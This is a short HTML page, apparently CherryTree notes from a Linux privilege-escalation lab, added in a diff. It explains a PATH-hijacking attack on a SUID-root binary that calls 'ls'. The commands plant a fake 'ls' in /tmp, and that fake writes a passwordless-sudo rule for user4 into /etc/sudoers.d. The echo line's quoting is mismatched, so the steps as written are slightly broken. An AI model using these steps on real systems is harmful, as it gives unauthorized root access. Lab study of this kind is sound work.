@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>PATH Variable</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>PATH Variable</h1><br/><a href=""><img src="images/1607-1.png" alt="images/1607-1.png" /></a><br /><a href=""><img src="images/1607-2.png" alt="images/1607-2.png" /></a><br /><br />script is opviously the binary for ls. It aslo has the SUID bit set to run as root.<br /><br />cd /tmp<br />echo &quot;echo  &quot;user4 ALL=(ALL) NOPASSWD:ALL&quot; | sudo tee /etc/sudoers.d/user4&#39;<br />export PATH=/tmp:$PATH<br />~/script (or ls)<br />	now we are able to sudo without a password</div></body></html>
